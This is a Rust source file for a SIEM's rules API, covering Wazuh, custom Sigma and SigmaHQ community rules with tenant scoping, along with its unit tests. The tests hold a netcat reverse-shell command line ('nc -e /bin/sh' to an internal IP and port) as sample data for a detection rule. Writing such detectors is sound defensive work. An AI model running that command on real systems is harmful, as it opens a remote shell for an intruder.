//! The rules pages: the Wazuh ruleset (read-only, as in Wazuh) and the tenant's own
//! custom rules. A custom rule is a Sigma rule built from the page's form (one field,
//! a matcher, a value) and stored in ClickHouse `ndr.sigma_rules` (source 'custom',
//! the tenant's id; a platform admin's apply to every tenant, '*'); the Sigma engine
//! checks every archived event against it once reloaded. SigmaHQ community rules
//! live in the same table (source 'community', tenant '*').
//!
//! `GET|POST /api/rules`, `GET|DELETE /api/rules/:id`, `POST /api/rules/:id/toggle`,
//! `POST /api/rules/reload`, `POST /api/rules/sync-community`

use axum::extract::{Extension, Path, Query, State};
use axum::http::StatusCode;
use axum::response::{IntoResponse, Response};
use axum::Json;
use serde::Deserialize;
use serde_json::{json, Value};

use crate::tenancy::AuthCtx;
use crate::AppState;

/// Custom rules a tenant may keep.
const MAX_CUSTOM_RULES: u64 = 500;
const SYNC_LOCK: &str = "siem:lock:sigma-community-sync";

fn err(code: StatusCode, m: impl Into<String>) -> Response {
    (code, Json(json!({ "status": "error", "message": m.into() }))).into_response()
}

/// The tenant a caller's custom rules belong to: '*' (every tenant) for a platform
/// admin who picked none, else the caller's tenant.
fn rule_tenant(ctx: &AuthCtx) -> String {
    if ctx.is_super() && ctx.requested_tenant.is_none() {
        "*".into()
    } else {
        ctx.scope()
    }
}

fn severity_of(level: u8) -> &'static str {
    match level {
        12.. => "critical",
        8..=11 => "high",
        4..=7 => "medium",
        _ => "low",
    }
}

#[derive(clickhouse::Row, Deserialize)]
struct RuleRow {
    id: String,
    name: String,
    content: String,
    enabled: u8,
    tenant_id: String,
    source: String,
    updated_at: u32,
}

const ROW_SQL: &str = "SELECT id, name, content, enabled, tenant_id, source, toUInt32(updated_at) AS updated_at FROM ndr.sigma_rules FINAL";

/// The caller's custom rules (its tenant's and the platform's '*').
async fn custom_rules(state: &AppState, ctx: &AuthCtx) -> Vec<RuleRow> {
    state
        .db
        .root()
        .query(&format!("{ROW_SQL} WHERE source = 'custom' AND tenant_id IN (?, '*') ORDER BY updated_at DESC"))
        .bind(rule_tenant(ctx))
        .fetch_all::<RuleRow>()
        .await
        .unwrap_or_default()
}

async fn rule_row(state: &AppState, id: &str) -> Option<RuleRow> {
    state.db.root().query(&format!("{ROW_SQL} WHERE id = ? LIMIT 1")).bind(id).fetch_all::<RuleRow>().await.ok()?.into_iter().next()
}

/// The form a custom rule was made from (its Sigma JSON has one selection).
fn form_of(content: &str) -> Value {
    let r: Value = serde_json::from_str(content).unwrap_or_default();
    let (key, value) = r["detection"]["selection"].as_object().and_then(|m| m.iter().next()).map(|(k, v)| (k.clone(), v.clone())).unwrap_or_default();
    let (field, matcher) = key.split_once('|').map_or((key.as_str(), "equals"), |(f, m)| (f, m));
    json!({
        "title": r["title"], "severity": r["level"], "description": r["description"], "tags": r["tags"],
        "field": field, "matcher": matcher, "value": value,
    })
}

fn custom_json(r: &RuleRow) -> Value {
    let f = form_of(&r.content);
    json!({
        "id": r.id, "title": r.name, "description": f["description"], "severity": f["severity"], "level": crate::sigma::level(f["severity"].as_str().unwrap_or("")),
        "enabled": r.enabled == 1, "groups": f["tags"], "tags": f["tags"], "conditions": 1, "mitre": Value::Null,
        "source": "custom", "editable": true, "all_tenants": r.tenant_id == "*",
        "field": f["field"], "matcher": f["matcher"], "value": f["value"],
    })
}

#[derive(Deserialize)]
pub struct RulesQuery {
    limit: Option<usize>,
    offset: Option<usize>,
    q: Option<String>,
}

/// `GET /api/rules`: the caller's custom rules first, then the Wazuh ruleset.
pub async fn list(State(state): State<AppState>, Extension(ctx): Extension<AuthCtx>, Query(query): Query<RulesQuery>) -> impl IntoResponse {
    let custom = custom_rules(&state, &ctx).await;
    let enabled_custom = custom.iter().filter(|r| r.enabled == 1).count();
    let wazuh = state.engine.list_rules();
    let active = wazuh.len() + enabled_custom;
    let mut rules: Vec<Value> = custom.iter().map(custom_json).collect();
    rules.extend(wazuh.into_iter().map(|r| {
        json!({
            "id": r.id.to_string(), "title": r.description, "description": r.description, "level": r.level, "severity": severity_of(r.level),
            "enabled": true, "groups": r.groups, "tags": r.groups, "conditions": 1, "mitre": r.mitre, "source": "wazuh", "editable": false,
        })
    }));
    if let Some(q) = query.q.as_deref().map(str::to_lowercase).filter(|q| !q.is_empty()) {
        rules.retain(|r| [&r["title"], &r["id"]].iter().any(|v| v.as_str().unwrap_or("").to_lowercase().contains(&q)));
    }
    let total = rules.len();
    let page: Vec<Value> = rules.into_iter().skip(query.offset.unwrap_or(0)).take(query.limit.unwrap_or(usize::MAX)).collect();
    let mut headers = axum::http::HeaderMap::new();
    headers.insert("X-Total-Count", total.into());
    headers.insert("X-Active-Count", active.into());
    (StatusCode::OK, headers, Json(page))
}

/// `GET /api/rules/:id`: a custom rule (with its form), or a Wazuh rule.
pub async fn get_one(State(state): State<AppState>, Extension(ctx): Extension<AuthCtx>, Path(id): Path<String>) -> Response {
    if let Some(r) = rule_row(&state, &id).await.filter(|r| r.source == "custom" && (r.tenant_id == rule_tenant(&ctx) || r.tenant_id == "*")) {
        return Json(custom_json(&r)).into_response();
    }
    match state.engine.list_rules().into_iter().find(|r| r.id.to_string() == id) {
        Some(r) => Json(json!({ "id": id, "title": r.description, "severity": severity_of(r.level), "level": r.level, "source": "wazuh", "editable": false })).into_response(),
        None => err(StatusCode::NOT_FOUND, "Rule not found"),
    }
}

#[derive(Deserialize)]
pub struct RuleForm {
    title: String,
    severity: String,
    #[serde(default)]
    description: String,
    field: String,
    value: String,
    matcher: String,
    #[serde(default)]
    tags: Vec<String>,
}

/// The Sigma rule of a form (JSON, which is YAML), after checking every input.
pub fn sigma_of(f: &RuleForm, id: &str, author: &str) -> Result<String, String> {
    let title = f.title.trim();
    if title.is_empty() || title.chars().count() > 200 {
        return Err("The title is required (at most 200 characters)".into());
    }
    if !["critical", "high", "medium", "low"].contains(&f.severity.as_str()) {
        return Err("Severity must be critical, high, medium or low".into());
    }
    let field = f.field.trim();
    if field.is_empty() || field.len() > 64 || !field.starts_with(|c: char| c.is_ascii_alphabetic()) || !field.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '.') {
        return Err("The field is a name such as CommandLine or alert.signature".into());
    }
    let value = f.value.trim();
    if value.is_empty() || value.chars().count() > 500 {
        return Err("The value is required (at most 500 characters)".into());
    }
    let key = match f.matcher.as_str() {
        "equals" => field.to_string(),
        m @ ("contains" | "startswith" | "endswith") => format!("{field}|{m}"),
        "re" => {
            regex::RegexBuilder::new(value).size_limit(1 << 20).build().map_err(|e| format!("Invalid regular expression: {e}"))?;
            format!("{field}|re")
        }
        _ => return Err("The matcher is equals, contains, startswith, endswith or re".into()),
    };
    let mut tags = Vec::new();
    for t in f.tags.iter().map(|t| t.trim().to_lowercase()).filter(|t| !t.is_empty()).take(10) {
        if t.len() > 64 || !t.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c)) {
            return Err(format!("Invalid tag '{t}' (letters, digits, '.', '_', '-')"));
        }
        tags.push(t);
    }
    let description: String = f.description.trim().chars().take(1000).collect();
    let rule = json!({
        "title": title, "id": id, "status": "experimental", "description": description, "author": author,
        "tags": tags, "level": f.severity, "logsource": {},
        "detection": { "selection": { key: value }, "condition": "selection" },
    });
    let text = rule.to_string();
    provigil_common::detection::parse_rule_content(&text).map_err(|e| format!("The rule does not parse: {e}"))?;
    Ok(text)
}

/// `POST /api/rules`: a new custom rule of the caller's tenant, active at once.
pub async fn create(State(state): State<AppState>, Extension(ctx): Extension<AuthCtx>, Json(f): Json<RuleForm>) -> Response {
    let tenant = rule_tenant(&ctx);
    let count: u64 = state
        .db
        .root()
        .query("SELECT count() FROM ndr.sigma_rules FINAL WHERE source = 'custom' AND tenant_id = ?")
        .bind(&tenant)
        .fetch_one()
        .await
        .unwrap_or(0);
    if count >= MAX_CUSTOM_RULES {
        return err(StatusCode::CONFLICT, format!("This tenant already has {MAX_CUSTOM_RULES} custom rules; delete some first"));
    }
    let id = format!("custom-{}", uuid::Uuid::new_v4());
    let content = match sigma_of(&f, &id, &ctx.username) {
        Ok(c) => c,
        Err(m) => return err(StatusCode::BAD_REQUEST, m),
    };
    let saved = state
        .db
        .root()
        .query("INSERT INTO ndr.sigma_rules (id, name, content, enabled, tenant_id, source, created_at, updated_at) VALUES (?, ?, ?, 1, ?, 'custom', now(), now())")
        .bind(&id)
        .bind(f.title.trim())
        .bind(&content)
        .bind(&tenant)
        .execute()
        .await;
    if let Err(e) = saved {
        return err(StatusCode::SERVICE_UNAVAILABLE, format!("The rule was not saved: {e}"));
    }
    let loaded = crate::sigma::reload(&state).await.unwrap_or(0);
    tracing::info!("rules: {} created custom rule {id} for tenant {tenant}", ctx.username);
    Json(json!({ "status": "created", "id": id, "sigma_rules_loaded": loaded })).into_response()
}

/// A rule the caller may change: its tenant's custom rule, a platform admin's '*' one,
/// or (platform admin) a SigmaHQ community rule.
async fn changeable(state: &AppState, ctx: &AuthCtx, id: &str) -> Result<RuleRow, Response> {
    match rule_row(state, id).await {
        Some(r) if r.source == "custom" && r.tenant_id == rule_tenant(ctx) => Ok(r),
        Some(r) if r.source == "community" && ctx.is_super() => Ok(r),
        Some(r) if r.source == "community" => Err(err(StatusCode::FORBIDDEN, "SigmaHQ community rules apply to every tenant: only the platform admin switches them")),
        Some(_) => Err(err(StatusCode::NOT_FOUND, "Rule not found")),
        None if state.engine.list_rules().iter().any(|r| r.id.to_string() == id) => {
            Err(err(StatusCode::BAD_REQUEST, "Built-in Wazuh rules cannot be changed or switched off here; add a custom rule instead"))
        }
        None => Err(err(StatusCode::NOT_FOUND, "Rule not found")),
    }
}

/// `DELETE /api/rules/:id`: a custom rule.
pub async fn delete(State(state): State<AppState>, Extension(ctx): Extension<AuthCtx>, Path(id): Path<String>) -> Response {
    let r = match changeable(&state, &ctx, &id).await {
        Ok(r) if r.source == "custom" => r,
        Ok(_) => return err(StatusCode::BAD_REQUEST, "Community rules are switched off, not deleted (the weekly sync would add them back)"),
        Err(e) => return e,
    };
    let deleted = state
        .db
        .root()
        .query("ALTER TABLE ndr.sigma_rules DELETE WHERE id = ? AND tenant_id = ? AND source = 'custom' SETTINGS mutations_sync = 2")
        .bind(&r.id)
        .bind(&r.tenant_id)
        .execute()
        .await;
    if let Err(e) = deleted {
        return err(StatusCode::SERVICE_UNAVAILABLE, format!("The rule was not deleted: {e}"));
    }
    let loaded = crate::sigma::reload(&state).await.unwrap_or(0);
    tracing::info!("rules: {} deleted custom rule {id}", ctx.username);
    Json(json!({ "status": "deleted", "id": id, "sigma_rules_loaded": loaded })).into_response()
}

#[derive(Deserialize)]
pub struct ToggleBody {
    enabled: Option<bool>,
}

/// `POST /api/rules/:id/toggle` `{enabled}` (without it: the opposite of now).
pub async fn toggle(State(state): State<AppState>, Extension(ctx): Extension<AuthCtx>, Path(id): Path<String>, body: Option<Json<ToggleBody>>) -> Response {
    let r = match changeable(&state, &ctx, &id).await {
        Ok(r) => r,
        Err(e) => return e,
    };
    let enabled = body.and_then(|b| b.enabled).unwrap_or(r.enabled == 0);
    // a new version replaces the row (ReplacingMergeTree on updated_at, in seconds): it must be later
    let updated = (chrono::Utc::now().timestamp().max(0) as u32).max(r.updated_at + 1);
    let saved = state
        .db
        .root()
        .query("INSERT INTO ndr.sigma_rules (id, name, content, enabled, tenant_id, source, updated_at) VALUES (?, ?, ?, ?, ?, ?, toDateTime(?))")
        .bind(&r.id)
        .bind(&r.name)
        .bind(&r.content)
        .bind(enabled as u8)
        .bind(&r.tenant_id)
        .bind(&r.source)
        .bind(updated)
        .execute()
        .await;
    if let Err(e) = saved {
        return err(StatusCode::SERVICE_UNAVAILABLE, format!("The rule was not changed: {e}"));
    }
    let loaded = crate::sigma::reload(&state).await.unwrap_or(0);
    tracing::info!("rules: {} {} rule {id}", ctx.username, if enabled { "enabled" } else { "disabled" });
    Json(json!({ "status": "ok", "id": id, "enabled": enabled, "active_rules": state.engine.list_rules().len() + loaded })).into_response()
}

/// `POST /api/rules/reload`: the Sigma rules again from ClickHouse.
pub async fn reload(State(state): State<AppState>) -> Response {
    match crate::sigma::reload(&state).await {
        Ok(n) => Json(json!({ "status": "ok", "count": state.engine.list_rules().len() + n, "sigma_rules": n })).into_response(),
        Err(e) => err(StatusCode::SERVICE_UNAVAILABLE, format!("Rules not reloaded: {e}")),
    }
}

/// `POST /api/rules/sync-community` (platform admin): new SigmaHQ rules into
/// ClickHouse in the background; one sync at a time across every siem-api (Valkey lock).
pub async fn sync_community(State(state): State<AppState>, Extension(ctx): Extension<AuthCtx>) -> Response {
    if !ctx.is_super() {
        return err(StatusCode::FORBIDDEN, "SigmaHQ community rules are shared by every tenant: the platform admin syncs them (they also sync weekly by themselves)");
    }
    if !crate::tenancy::valkey_lock(SYNC_LOCK, 1800).await {
        return Json(json!({ "status": "already_running", "message": "A SigmaHQ sync is already running; check back in a few minutes" })).into_response();
    }
    tokio::spawn(async move {
        match crate::sigma::sync_community(&state).await {
            Ok((saved, loaded)) => tracing::info!("rules: SigmaHQ sync saved {saved} new rule(s); {loaded} loaded"),
            Err(e) => tracing::warn!("rules: SigmaHQ sync failed: {e}"),
        }
        crate::tenancy::valkey_unlock(SYNC_LOCK).await;
    });
    Json(json!({ "status": "started", "message": "SigmaHQ sync started in the background" })).into_response()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn form(field: &str, matcher: &str, value: &str) -> RuleForm {
        RuleForm { title: "Netcat reverse shell".into(), severity: "high".into(), description: "nc -e".into(), field: field.into(), value: value.into(), matcher: matcher.into(), tags: vec!["attack.t1059".into()] }
    }

    #[test]
    fn a_form_becomes_a_sigma_rule_the_engine_matches() {
        let text = sigma_of(&form("CommandLine", "contains", "nc -e /bin/sh"), "custom-1", "ana").unwrap();
        let rule = provigil_common::detection::parse_rule_content(&text).unwrap();
        let mut e = provigil_common::detection::DetectionEngine::new("");
        let mut rule = rule;
        rule.tenant_id = "acme".into();
        e.set_rules(vec![rule], std::collections::HashMap::new());
        let mut ev = provigil_common::normalizer::NormalizedEvent::blank();
        ev.raw = json!({ "CommandLine": "bash -c 'nc -e /bin/sh 10.0.0.9 4444'" });
        assert_eq!(e.check_for_tenant(&ev, "acme").len(), 1);
        assert!(e.check_for_tenant(&ev, "other").is_empty(), "a tenant's custom rule is not another's");
        ev.raw = json!({ "CommandLine": "ls -la" });
        assert!(e.check_for_tenant(&ev, "acme").is_empty());
        // the page's edit form comes back
        let f = form_of(&text);
        assert_eq!((f["field"].as_str(), f["matcher"].as_str(), f["value"].as_str(), f["severity"].as_str()), (Some("CommandLine"), Some("contains"), Some("nc -e /bin/sh"), Some("high")));
        assert_eq!(form_of(&sigma_of(&form("proto", "equals", "icmp"), "c2", "a").unwrap())["matcher"], "equals");
    }

    #[test]
    fn bad_input_is_refused() {
        assert!(sigma_of(&form("Command Line", "contains", "x"), "c", "a").is_err(), "field name");
        assert!(sigma_of(&form("CommandLine", "re", "(unclosed"), "c", "a").unwrap_err().contains("regular expression"));
        assert!(sigma_of(&form("CommandLine", "eval", "x"), "c", "a").is_err(), "matcher");
        assert!(sigma_of(&form("CommandLine", "contains", " "), "c", "a").is_err(), "empty value");
        let mut f = form("CommandLine", "contains", "x");
        f.severity = "urgent".into();
        assert!(sigma_of(&f, "c", "a").is_err());
        f.severity = "low".into();
        f.tags = vec!["bad tag!".into()];
        assert!(sigma_of(&f, "c", "a").is_err());
        // quotes and newlines in the value stay data, not rule structure
        let text = sigma_of(&form("CommandLine", "contains", "a\"\n  condition: x"), "c", "a").unwrap();
        assert_eq!(form_of(&text)["value"], "a\"\n  condition: x");
    }
}
